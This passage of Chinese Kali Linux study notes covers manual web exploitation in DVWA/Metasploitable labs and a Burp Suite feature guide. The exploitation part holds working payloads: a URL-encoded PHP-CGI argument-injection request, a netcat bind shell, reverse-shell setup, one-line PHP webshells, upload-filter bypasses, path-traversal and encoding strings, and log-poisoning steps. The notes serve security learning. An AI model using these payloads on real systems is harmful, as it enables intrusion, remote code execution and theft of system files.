<h4 id="2-手动漏洞挖掘–默认安装-▲-2020-1-2-phpMyAdmin进行重放攻击不成功"><a href="#2-手动漏洞挖掘–默认安装-▲-2020-1-2-phpMyAdmin进行重放攻击不成功" class="headerlink" title="2. 手动漏洞挖掘–默认安装 ▲ 2020.1.2 phpMyAdmin进行重放攻击不成功"></a>2. 手动漏洞挖掘–默认安装 ▲ 2020.1.2 phpMyAdmin进行重放攻击不成功</h4><ul>
<li>Windows默认安装漏洞</li>
<li>phpMyAdmin/setup（可以不需要账号密码直接访问）</li>
<li>Ubuntu/Debian默认安装PHP5-cgi（php位于/usr/bin目录下）</li>
<li>可直接访问/cgi-bin/php5和/cgi-bin/php（爬不出来的目录）</li>
</ul>
<blockquote>
<pre><code>⭐phpMyAdmin → 通过Burpsuite进行重放（正向）：
POST http://ip地址/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
Host:ip地址

&lt;?php 
passthru(&quot;id/ls/echo &quot;adadsadas&quot; &gt;&gt; a.php&quot;);
die();
?&gt;

⭐PHP5-cgi → 通过Burpsuite进行重放（正向）：
POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E %63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D %6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C %61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F %66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F %62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F %70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E %70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F %72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E %72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+ %2D%6E HTTP/1.1
Host：123

&lt;?php
    echo system(&#39;cat /etc/passwd&#39;);
?&gt;
▲ exec()函数执行命令时，如&#39;cat /etc/passwd&#39; 只返回最后一行的内容
▲ host无作用，但因为请求头需要host

⭐PHP5-cgi → 通过Burpsuite进行重放（网页主动打开一个侦听端口）：
POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E %63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D %6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C %61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F %66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F %62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F %70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E %70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F %72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E %72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+ %2D%6E HTTP/1.1
Host：123

&lt;?php
    echo system(&#39;mkfifo /tmp/pipe;sh /tmp/pipe | nc -nlp 4444 &gt; /tmp/pipe&#39;);
?&gt;</code></pre></blockquote>
<h4 id="3-手动漏洞挖掘–PHP反弹Shell以及写入WebShell"><a href="#3-手动漏洞挖掘–PHP反弹Shell以及写入WebShell" class="headerlink" title="3. 手动漏洞挖掘–PHP反弹Shell以及写入WebShell"></a>3. 手动漏洞挖掘–PHP反弹Shell以及写入WebShell</h4><ul>
<li>PHP反弹shell<ul>
<li><strong><code>🔺命令：cp  /usr/share/webshells/php/php-reverse-shell.php ./3.php</code></strong></li>
<li><strong><code>🔺命令：vi 3.php</code></strong></li>
<li>修改反弹Shell的ip</li>
<li>3.php的内容加在POST中的body部分</li>
<li>nc 侦听端口</li>
<li>发送POST信息到phpMyAdmin上</li>
<li>获得Shell</li>
</ul>
</li>
<li>File</li>
<li>Whereis<ul>
<li>ifconfig</li>
</ul>
</li>
<li>写入WebShell<ul>
<li><strong><code>🔺命令：echo &quot;&lt;?php \$cmd=\$_GET[&quot;cmd&quot;];system(\$cmd);?&gt;&quot; &gt; /var/www/2.php</code></strong>（\用于避免$后面的变量过滤）</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(四十七)：手动漏洞挖掘--文件上传</title>
    <url>/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%83)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<hr>
<h4 id="1-手动漏洞挖掘"><a href="#1-手动漏洞挖掘" class="headerlink" title="1. 手动漏洞挖掘"></a>1. 手动漏洞挖掘</h4><ul>
<li><?php echo shell_exec($_GET['cmd']);?></li>
<li>直接上传webshell</li>
<li>修改文件类型上传webshell<ul>
<li>Mimetype–文件头、扩展名（判断文件名mimetype 1.jpg）</li>
<li>一般判断文件类型判断两个方向：1.文件头前10个字节 2.扩展名</li>
</ul>
</li>
<li>修改扩展名上传webshell<ul>
<li>静态解析文件扩展名时可能无法执行</li>
</ul>
</li>
<li>文件头绕过过滤上传webshell</li>
<li>上传目录权限（上传权限限制，限制上传文件执行）</li>
<li>DVWA的Upload（low）：<ul>
<li>1.正常上传一张图片（.jpg,.png等图片文件，图片不能太大）</li>
<li>2.<strong><code>🔺命令：vi 1.php</code></strong>（<?php echo shell_exec($_GET['cmd']);?>）</li>
<li>3.可以正常上传，传入参数：?cmd=id（url中访问1.php）</li>
<li>▲ 绕过方法：1.上传php 2.修改请求头MAX_SIZE的大小进行重放</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php
    if(isset($_POST[&#39;upload&#39;])){
        $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;
        $target_path = $target_path.basename($_FILES[&#39;uploaded&#39;][&#39;name&#39;]);

        if(!move_uploaded_file($_FILES[&#39;uploaded&#39;][&#39;tmp_name&#39;].$target_path)){
            echo &#39;&lt;pre&gt;&#39;;
            echo &#39;Your image was not uploaded.&#39;;
            echo &#39;&lt;/pre&gt;&#39;;
        }else{
            echo &#39;&lt;pre&gt;&#39;;
            echo $target_path.&#39;successfully uploaded!&#39;;
            echo &#39;&lt;/pre&gt;&#39;;
        }
    }</code></pre><ul>
<li>DVWA的Upload（medium）：<ul>
<li>正常上传一张1.png文件，但不能正常上传，需要image/jpeg文件</li>
<li>▲ 绕过方法：修改请求头的Content-type为image/jpeg进行重放</li>
</ul>
</li>
</ul>
<pre><code>
&lt;?php
    if (isset($_POST[&#39;Upload&#39;])) {

            $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;
            $target_path = $target_path . basename($_FILES[&#39;uploaded&#39;][&#39;name&#39;]);
            $uploaded_name = $_FILES[&#39;uploaded&#39;][&#39;name&#39;];
            $uploaded_type = $_FILES[&#39;uploaded&#39;][&#39;type&#39;];
            $uploaded_size = $_FILES[&#39;uploaded&#39;][&#39;size&#39;];

            if (($uploaded_type == &quot;image/jpeg&quot;) &amp;&amp; ($uploaded_size &lt; 100000)){


                if(!move_uploaded_file($_FILES[&#39;uploaded&#39;][&#39;tmp_name&#39;], $target_path)) {

                    echo &#39;&lt;pre&gt;&#39;;
                    echo &#39;Your image was not uploaded.&#39;;
                    echo &#39;&lt;/pre&gt;&#39;;

                  } else {

                    echo &#39;&lt;pre&gt;&#39;;
                    echo $target_path . &#39; succesfully uploaded!&#39;;
                    echo &#39;&lt;/pre&gt;&#39;;

                    }
            }
            else{
                echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;
            }
        }
?&gt;</code></pre><ul>
<li>DVWA的Upload（high）：<ul>
<li>▲ 绕过方法：修改请求头中的filename为1.php.jpg进行重放</li>
<li>防护方法：更严格防护判断文件传输body中对文件类型的定义（但仍不安全）</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php
if (isset($_POST[&#39;Upload&#39;])) {

            $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;
            $target_path = $target_path . basename($_FILES[&#39;uploaded&#39;][&#39;name&#39;]);
            $uploaded_name = $_FILES[&#39;uploaded&#39;][&#39;name&#39;];
            $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, &#39;.&#39;) + 1);
            $uploaded_size = $_FILES[&#39;uploaded&#39;][&#39;size&#39;];

            if (($uploaded_ext == &quot;jpg&quot; || $uploaded_ext == &quot;JPG&quot; || $uploaded_ext == &quot;jpeg&quot; || $uploaded_ext == &quot;JPEG&quot;) &amp;&amp; ($uploaded_size &lt; 100000)){


                if(!move_uploaded_file($_FILES[&#39;uploaded&#39;][&#39;tmp_name&#39;], $target_path)) {

                    echo &#39;&lt;pre&gt;&#39;;
                    echo &#39;Your image was not uploaded.&#39;;
                    echo &#39;&lt;/pre&gt;&#39;;

                  } else {

                    echo &#39;&lt;pre&gt;&#39;;
                    echo $target_path . &#39; succesfully uploaded!&#39;;
                    echo &#39;&lt;/pre&gt;&#39;;

                    }
            }

            else{

                echo &#39;&lt;pre&gt;&#39;;
                echo &#39;Your image was not uploaded.&#39;;
                echo &#39;&lt;/pre&gt;&#39;;

            }
        }

?&gt;</code></pre><ul>
<li>DVWA的Upload（more high）：<ul>
<li>防护判断文件传输body中对文件类型的定义</li>
<li>▲ 绕过方法：1.找一张jpeg的图片，修改请求头中的filename为1.php.jpg 2.删除body中的jpeg图片中相关像素的信息，替换为webshell 3.进行重放</li>
<li>防护方法：修改上一次目录的属主等其他用户的执行权限（权限为620–无执行权限）</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(四十六)：手动漏洞挖掘--目录遍历、文件包含</title>
    <url>/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AD)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<hr>
<h4 id="1-手动漏洞挖掘–目录遍历-文件包含"><a href="#1-手动漏洞挖掘–目录遍历-文件包含" class="headerlink" title="1. 手动漏洞挖掘–目录遍历/文件包含"></a>1. 手动漏洞挖掘–目录遍历/文件包含</h4><ul>
<li>Directory traversal/File include（有区别/没区别）<ul>
<li>目录权限限制不严/文件包含</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐区别:
目录遍历：操作系统内部文件
文件包含：1.LFI包含本地文件include 
         2.RFI远程文件包含include（php的include函数）
▲ Directory Browser和Directory traversal/pass不同</code></pre></blockquote>
<ul>
<li>修改Metasploitable的配置文件，使Metasploitable出现远程文件包含漏洞<ul>
<li><strong><code>🔺命令：sudo vi /etc/php5/cgi/php.ini</code></strong></li>
<li>allow_url_include=On</li>
<li><strong><code>🔺命令：sudo /etc/init.d/apache2 restart</code></strong></li>
</ul>
</li>
<li>应用程序功能操作文件，限制不严时导致访问WEB目录以外的文件<ul>
<li>读、写文件、远程执行代码</li>
</ul>
</li>
<li>特征但不绝对<ul>
<li>?page=a.php</li>
<li>?home=b.html</li>
<li>?file=content</li>
</ul>
</li>
<li>经典测试方法<ul>
<li>?file=../../../../../../../../etc/passwd</li>
<li>?page=file:///etc/passwd（文件包含的话，可以直接填写绝对路径）</li>
<li>?home=main.cgi</li>
<li>?page=<a href="http://www.a.com/1.php（远程文件包含）" target="_blank" rel="noopener">http://www.a.com/1.php（远程文件包含）</a></li>
<li><a href="http://1.1.1.1/../../../../../dir/file.txt" target="_blank" rel="noopener">http://1.1.1.1/../../../../../dir/file.txt</a></li>
</ul>
</li>
<li>编码绕过字符过滤<ul>
<li>“.” “%00”–空字符（绕过文件扩展名过滤）</li>
<li>?file=a.doc%00.php</li>
<li>使用多种编码尝试</li>
</ul>
</li>
<li>不同操作系统的路径特征字符<ul>
<li>类Unix系统（根目录:/  目录层级分隔符:/）</li>
<li>Windows系统（C:/  \或/）</li>
</ul>
</li>
<li>URL编码、双层URL编码<ul>
<li>%2e%2e%2f        解码：../</li>
<li>%2e%2e%5c        解码：..\</li>
<li>%252e%252e%255c  解码：..\（双层编码，%25解码后为%）</li>
</ul>
</li>
<li>Unicode/UTF-8编码<ul>
<li>..%c0%af         解码：../</li>
<li>..%u2216</li>
<li>..%c1%9c         解码：..\</li>
</ul>
</li>
<li>其他系统路径可能使用到的字符<ul>
<li>file.txt…</li>
<li>file.txt<spaces></li>
<li>file.txt````````</li>
<li>file.txt&lt;&lt;&lt;&gt;&gt;&gt;</li>
<li>./././file.txt</li>
<li>nonexistant/../file.txt（不存在的目录）</li>
</ul>
</li>
<li>UNC路径（文件共享路径）<ul>
<li>\1.1.1.1\path\to\file.txt</li>
</ul>
</li>
<li>本地文件抱哈LFI（一般很难代码执行）<ul>
<li>查看文件</li>
<li>代码执行</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐LFI的代码执行
1.Kali开启nc侦听80端口（目标主机），发送&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;
2.可查看/var/log/apache2/access.log中有记录（服务器apache2日志文件）
3.查看access.log文件www-data用户是否可以进行执行修改
4.chmod a+rx access.log（若www-data无权限，假设可修改文件属性）
5.chmod a+xr apache2（若www-data无权限，假设可修改文件属性）
6.ls -ld查看权限，保证上级上上级可被www-data执行
7.?page=/var/log/apache2/access.log（LFI本地文件包含）</code></pre></blockquote>
<ul>
<li>远程文件执行RFI<ul>
<li>出现概率少于LFI，但更容易被利用</li>
<li>测试 </li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐测试远程文件包含
1.kali本地侦听80端口（本机端口）
2.Web page页?page=http://Kali 地址/a.php（不存在的php页面）
3.若kali收到请求，则表示测试成功
⭐远程文件包含
1.Kali机子上vi 1.txt
2.&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;
3.Kali机子上service apache2 start（存放在/var/www/html/）
4.DVWA访问?page=http://kali ip地址/1.txt&amp;cmd=pwd</code></pre></blockquote>
<ul>
<li>DVWA的File Inclusion（low）</li>
<li>多种绕过方法</li>
</ul>
<pre><code>&lt;?php
    $file = $_GET[&#39;page&#39;];
?&gt;</code></pre><ul>
<li>DVWA的File Inclusion（mediaum）</li>
<li>绕过方法:ht<a href="http://tp://dvwa/" target="_blank" rel="noopener">http://tp://dvwa/</a>….</li>
</ul>
<pre><code>&lt;?php
    $file = $_GET[&#39;page&#39;];

    $file = str_replace(&quot;http://&quot;,&quot;&quot;,$file);
    $file = str_replace(&quot;https://&quot;,&quot;&quot;,$file);</code></pre><ul>
<li>DVWA的File Inclusion（high）</li>
<li>暂无绕过方法</li>
</ul>
<pre><code>&lt;?php
    $file = $_GET[&#39;page&#39;];

    if($file!=&quot;include.php&quot;)
    {
        echo &quot;ERROR:File not found!&quot;;
        exit;
    }
?&gt;</code></pre><ul>
<li>/usr/share/wfuzz/wordlist/vulns/（Kali集成攻击向量字典）</li>
</ul>
<h4 id="2-手动漏洞挖掘–Cookie存在漏洞"><a href="#2-手动漏洞挖掘–Cookie存在漏洞" class="headerlink" title="2. 手动漏洞挖掘–Cookie存在漏洞"></a>2. 手动漏洞挖掘–Cookie存在漏洞</h4><ul>
<li>代码</li>
</ul>
<pre><code>&lt;?php
$template = &#39;blue.php&#39;
if( is_set($_COOKIE[&#39;TEMPLATE&#39;]))
    $template = $_COOKIE[&#39;TEMPLATE&#39;]
include (&quot;/home/users/phpguru/template/&quot;.$template)
?&gt;</code></pre><ul>
<li>攻击</li>
</ul>
<pre><code>GET /vulnerable.php HTTP/1.0
Cookie:TEMPLATE=../../../../../../../../etc/passwd</code></pre><ul>
<li>结果</li>
</ul>
<pre><code>HTTP/1.0 200 OK
Content=Type:text/html
Server:Apache

root:fi3sED95ibqR6:0:1:System Operator:/:/bin/ksh
daemon:*:1:1::/tmp:
phpguru:f8fk3j1oIf31.:182:100:Developer:/home/users/phpguru/:bin/csh</code></pre>]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(四十三)：Burpsuite</title>
    <url>/2020/01/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%89)%EF%BC%9ABurpsuite/</url>
    <content><![CDATA[<hr>
<h4 id="1-Burpsuite"><a href="#1-Burpsuite" class="headerlink" title="1. Burpsuite"></a>1. Burpsuite</h4><ul>
<li>Web安全工具中的瑞士军刀</li>
<li>统一的集成工具发现全部现代WEB安全漏洞</li>
<li>PortSwigger公司开发（基于JAVA）<ul>
<li>Burp Free</li>
<li>Burp Professional</li>
<li><a href="http://www.portswigger.net" target="_blank" rel="noopener">http://www.portswigger.net</a></li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>▲ Free版本和Professional版本之间的区别是，Free版本没有主动扫描功能</code></pre></blockquote>
<ul>
<li>所有的工具共享一个能处理并显示HTTP消息的可扩展框架，模块之间无缝交换信息</li>
<li>字体（首次启动修改字体）<ul>
<li>Options → Display → HTTP Message Dispaly → 中文字体</li>
</ul>
</li>
</ul>
<h4 id="2-Burpsuite-Proxy"><a href="#2-Burpsuite-Proxy" class="headerlink" title="2. Burpsuite Proxy"></a>2. Burpsuite Proxy</h4><ul>
<li>Options<ul>
<li>Proxy Listeners（默认监听8080）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐Banding 监听的端口，可以修改IP作为代理转发   
⭐Request handing 转发到其他主机，非真正目的地址（Redirect to host/port） 
▲ Invisible proxy 对于客户端程序不支持代理但走HTTPS协议代理功能的程序。
1.其原理是欺骗本机的DNS服务器，将所要发送的域名解析成Burpsuite的IP地址，然后通过Burpsuit本机的DNS服务器或者局域网内的解析成对公网的IP地址
2.但若本机和Burpsuit在同一台机器上，会陷入欺骗，解析本地地址的死循环
3.需要通过Options → Hostname Resolution去增加解析地址
▲ Invisible Proxy主机头问题 
1.When using plain HTTP,a proxy-style request looks like this:
GET http://example.org/foo.php HTTP/1.1
Host:example.org
2.Whereas the corresponding non-proxy-style request looks like this:
GET:/foo.php HTTP/1.1
Host:example.org
不支持代理的Web Application可能多为第二种情况的请求，不包含完整头部的HTTP头部请求，此时可开启环回网卡的Invisible Proxy功能，然后通过Redirect to host/port重定向到需要访问真正的目标地址
▲ Invisible Proxy多目标域名问题
可以创建多个环回网卡Lookback，监听多个端口，每个环回网卡都开启Invisible Proxy，然后通过Redirect to host/port重定向到需要访问真正的目标地址
⭐CA certificate（导入导出）
1.Export → certificate in DER format
2.在Proxy情况下，访问http://burp，生成CA certificate</code></pre></blockquote>
<ul>
<li>Options<ul>
<li>Intercept Client Request（默认截断）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>▲ 默认情况下只有一条规则：File extension
▲ 请求头发生变化：Automatically uodate Content-Length header when the request is edited</code></pre></blockquote>
<ul>
<li>Options<ul>
<li>Intercept Server Responses（默认不截断）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>默认情况下只有一条规则：Content type header</code></pre></blockquote>
<ul>
<li>Options<ul>
<li>Intercept WeSockets Messages</li>
<li>Response Modification</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>▲ 常用的Modification
Unhide hidden from fields（显示隐藏表单）
Enable disabled form fields（激活被禁止的表单）
Remove input field length limits（去除输入限制长度）
Remove JavaScript from validation（去除JavaScript的验证）
Remove All JavaScript（去除所有的JavaScript）
Remove secure flag from cookies（去掉cookies的安全标签）</code></pre></blockquote>
<ul>
<li>Options<ul>
<li>Match and Replace（匹配和替换，Request header match就repalce）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>▲ 提交数据的自动修改
Original reequest 原始的请求
Auto-modified request 修改后的请求</code></pre></blockquote>
<ul>
<li>Options<ul>
<li>SSL Pass Through（加密流量直接通过，不截获代理）</li>
</ul>
</li>
<li>Intercept（截断请求代理，默认不截断返回的流量）<ul>
<li>Intercept is on（截断代理开启）</li>
<li>Froward（单步发送信息）</li>
<li>Drop（丢弃包数据，不发送）</li>
</ul>
</li>
<li>HTTP history（截断代理历史）<ul>
<li>Request</li>
<li>Response</li>
</ul>
</li>
<li>Web Socket history（无界面的Web Application，SOCKET长连接） </li>
</ul>
<h4 id="3-Burpsuite-Target"><a href="#3-Burpsuite-Target" class="headerlink" title="3. Burpsuite Target"></a>3. Burpsuite Target</h4><ul>
<li>Site map<ul>
<li>黑色链接：真正访问的链接/灰色链接：通过爬网爬出来的链接，无进行真正访问</li>
<li>过滤功能：选择站点 → 右键 → Add to Scope（上方白色横条为过滤功能）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>▲  过滤：
过滤在Scope中的内容：Filter by request type → Show only in-scope items
过滤真正发生请求：Filter by request type → Show only requests items
过滤有参数的请求:Filter by request type → Show only oarameterised requests
指定参数进行过滤：Filter by search term → 输入字符串
过滤网页类型：Filter by MIME type
过滤访问请求码:Filter by status code
过滤文件扩展名：Filter by file extension
过滤高亮显示的网页： 右键高亮选中选项（Highlight） → Filter by abotation → Show only highlighted ietms
过滤有注释的网页：右键注释选中选项（Add Comment）→ Filter by abotation → Show only commented items</code></pre></blockquote>
<ul>
<li>Scope<ul>
<li>Add to Scope会生成过滤的正则表达式</li>
<li>Include in Scope（加入Scope）</li>
<li>Exclude from Scope（排除Scope）</li>
</ul>
</li>
</ul>
<h4 id="4-Burpsuite-Spider-▲-2020-1-3-新版暂无此扩展"><a href="#4-Burpsuite-Spider-▲-2020-1-3-新版暂无此扩展" class="headerlink" title="4. Burpsuite Spider ▲ 2020.1.3 新版暂无此扩展"></a>4. Burpsuite Spider ▲ 2020.1.3 新版暂无此扩展</h4><ul>
<li>手动爬网</li>
<li>自动爬网<ul>
<li>站点目录 → 右键 → Spider this branch</li>
</ul>
</li>
<li>Control<ul>
<li>Spider Status（Spider is pause自动爬网暂停/Clear queues清理要爬网队列）</li>
</ul>
</li>
<li>Options<ul>
<li>Application Login（Prompt for guidance提示）</li>
<li>Passive Spidering（对手动爬网进行分析）</li>
<li>Request Headers（请求头格式）</li>
</ul>
</li>
<li>比较不同账号或配置，爬网的内容<ul>
<li>站点目录 → 右键 → Compare site map</li>
<li>Use current site map（Site map 1）</li>
<li>Use all items with resposes/Include in-scope items only</li>
<li>Load from Burp state file（Site map 2）</li>
<li>Use all items with resposes/Include in-scope items only</li>
<li>Request Matching（可以默认）</li>
<li>Response Comparation（可以默认）</li>
<li>Sync selection（同步两次选中）</li>
</ul>
</li>
</ul>
<h4 id="5-Burpsuite-Scanner-▲-2020-1-3-新版暂无此扩展"><a href="#5-Burpsuite-Scanner-▲-2020-1-3-新版暂无此扩展" class="headerlink" title="5. Burpsuite Scanner ▲ 2020.1.3 新版暂无此扩展"></a>5. Burpsuite Scanner ▲ 2020.1.3 新版暂无此扩展</h4><ul>
<li>主动扫描：站点目录 → 右键 → Actively scan this branch</li>
<li>Options<ul>
<li>Attack Insertion Points</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐Place attacks into the following location within requests:
1.URL parameter values
2.Body parameter values
3.Cookies parameter values
4.parameter name
5.HTTP headers
6.AMF string parameter（Adobe Flash脚本注入）
7.REST-STYLE URL parameters
⭐Change parameter locations（causes many more scan requests）:
⭐Skip all tests for these parameters（Add）</code></pre></blockquote>
<ul>
<li>Options<ul>
<li>Active Scanning Engine（主动扫描）</li>
<li>Active Scanning Optimization（主动扫描选项：Speed（扫描速度）/accuracy（准确性））</li>
<li>Actvie Scanning Areas（主动扫描类型，默认全选）</li>
<li>Passive Scanning Areas（被动扫描类型，默认全选）</li>
</ul>
</li>
<li>Scan queue（扫描队列）</li>
<li>Results（扫描结果）</li>
</ul>
<h4 id="6-Burpsuite-Extender"><a href="#6-Burpsuite-Extender" class="headerlink" title="6. Burpsuite Extender"></a>6. Burpsuite Extender</h4><ul>
<li>BApp Store（商店扩展）</li>
<li>Entensions（安装的扩展）▲ jython（java访问python的中间组件）</li>
<li>Options<ul>
<li>Python Environment/jython Standalone Jar（<a href="http://www.jython.og/downloads.html）" target="_blank" rel="noopener">http://www.jython.og/downloads.html）</a></li>
<li>cp jython Standalone Jar /root/Desktop</li>
<li>推荐j2EEScan、CO2（图形化SQLMap）插件</li>
</ul>
</li>
</ul>
<h4 id="7-Burpsuite-Intruder"><a href="#7-Burpsuite-Intruder" class="headerlink" title="7. Burpsuite Intruder"></a>7. Burpsuite Intruder</h4><ul>
<li>选取爬取的站点选项Request右键 → Send to Intrude（发送模块）</li>
<li>Positiors<ul>
<li>Attcak type</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐Attcak type攻击类型（n比m大）
1.Sniper：先在第一个变量位置逐一插入，第二个位置不变；再在第二个变量位置逐一插入，第一个变量的位置不变（从指定的字典进行破解，只需要一个字典，总替换次数为m+n次）
2.Battering ram：在变量的位置上，都放上同样的值，变量上的值是一样的（从指定的字典进行破解，只需要一个字典，总替换次数为m+n次）
3.Pitchfork：从两个字典中各取出同序号的项目放入到变量的位置，若有一个字典的值结束，则此次破解结束（从指定的字典进行破解，需要两个字典，总替换次数为n次）
4.Cluster bomb：从第一个字典的第一项开始，尝试第二个字典的所有选项，再从第一个字典的第二项开始，尝试第二个字典的所有选项，以此类推（从指定的字典进行破解，需要两个字典，总替换次数为m*n次）</code></pre></blockquote>
<ul>
<li>Positiors<ul>
<li>打上$$作为变量</li>
<li>Clear $</li>
<li>选择变量Add $$</li>
<li>指定Attcak typ以及字典</li>
</ul>
</li>
<li>Payloads<ul>
<li>Payload Sets（字典类型）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐Payload Sets:
1.Simple list 简单字典
2.Runtime file 指定字典文件路径
3.Case modification 大小写的替换
4.Character blocks 字符块
5.Number 数字
6.Datas 日期
7.Brute force 暴力破解（Character set）
8.Username generator 用户名生成器（Add fanghong:yuan）
9.Copy other payload 复制字典文件</code></pre></blockquote>
<ul>
<li>Payloads<ul>
<li>Payload Options【Payload Sets】（选择密码字典文件）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐Add from list:
1.Fuzzing-full 常用fuzz字典</code></pre></blockquote>
<ul>
<li>Payloads<ul>
<li>Payload Processing（对Payload进行加工）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐Add:
1.Add prefix 添加字典前缀
2.Add suiffix 添加字典后缀
3.Match/replace 匹配就替换
4.Reverse substring 反转字符串
5.Modify case 修改大小写
6.Encode 编码
7.Decode 解码
8.Hash 哈希</code></pre></blockquote>
<ul>
<li>Payloads<ul>
<li>Payload Encoding（URL-encode these character编码字符）</li>
</ul>
</li>
<li>Options<ul>
<li>Grap Match（Add Match，默认是Exclude HTTP header，需要去除）</li>
</ul>
</li>
<li>在指定完所有的Intrude选项后，开始Intrude<ul>
<li>顶部 → Intruder → Start attack</li>
<li>可选择上方白色横条进行filter/或通过Options中的Grap Match进行匹配</li>
<li>▲ 基于此项Intruder功能，可以进行页面存在性的Fuzz（指定字典）</li>
</ul>
</li>
</ul>
<h4 id="8-Burpsuit-Repeater"><a href="#8-Burpsuit-Repeater" class="headerlink" title="8. Burpsuit Repeater"></a>8. Burpsuit Repeater</h4><ul>
<li>站点目录网页 → 右键 → Send to Repeater</li>
<li>重放：Request → Go → Response</li>
<li>更改请求方式：Request/Raw → 右键 → Change request method</li>
<li>更改body编码：Request/Raw → 右键 → Change body encoding</li>
<li>转换为curl命令形式：Request/Raw → 右键 → Copy as curl command</li>
<li>如果为CSRF漏洞存在页面（Request/Raw → 右键）<ul>
<li>Generate CSRF Poc（生成一份Poc代码文件）</li>
</ul>
</li>
<li>菜单栏 → Reperter<ul>
<li>Update Content-Length（默认自动调整）</li>
<li>Unpack gzip/deflate（默认自动解压）</li>
<li>Follow redirections（重定向）</li>
<li>Process cookies in redirections（处理Cookies重定向，带取Cookie）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐Follow redirections:
1.Never 不跟随重定向（默认）
2.One-site only 一个站点重定向
3.In-scope only 一个scope重定向
4.Always 总是重定向</code></pre></blockquote>
<h4 id="9-Burpsuit-Sequence"><a href="#9-Burpsuit-Sequence" class="headerlink" title="9. Burpsuit Sequence"></a>9. Burpsuit Sequence</h4><ul>
<li>删除浏览器的Cookies信息（抓取生成Cookies的过程）</li>
<li>站点目录网页 → 右键 → Send to Sequence</li>
<li>Token Location Within Response（令牌选择）<ul>
<li>如果自动识别：Cookies保存在Cookie中</li>
<li>如果未自动识别：可通过Custom location进行手动选择序列</li>
</ul>
</li>
<li>Select Live Capture Request<ul>
<li>Start live caputre（不断请求服务器，请求新生成SessionID进行分析）</li>
<li>收集SessionID → Analyze now </li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐Analyze（伪随机算法的分析）
1.Summary → Overall result
2.Character-level analysis 基于字符层面的分析
3.Bit-level analysis 基于位层面的分析
▲ FIPS--美国联邦信息处理标准（Federal Information Processing Standard）</code></pre></blockquote>
